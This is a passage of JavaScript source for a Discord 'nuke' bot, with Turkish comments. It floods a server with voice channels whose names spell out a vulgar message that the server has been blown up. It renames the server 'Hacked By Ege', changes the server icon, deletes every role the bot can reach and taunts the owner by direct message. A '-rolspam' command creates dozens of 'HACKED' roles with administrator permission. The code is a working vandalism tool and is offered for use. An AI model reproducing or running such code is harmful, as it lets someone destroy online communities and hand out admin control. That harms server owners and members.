      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild.setIcon("https://i.hizliresim.com/menhoo5.jpg"); //SUNUCUNUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("Hacked By Ege"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach((roles) => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER)
    await client.user.setAvatar("https://i.hizliresim.com/menhoo5.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("SANAL İCRAAT"); //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send(
      "** SUNUCUN PATLADI AFFETMEYİZ **"
    ); //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
  }
});

client.on("message", (msg) => {
  if (msg.content === "-rolspam") {
    //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
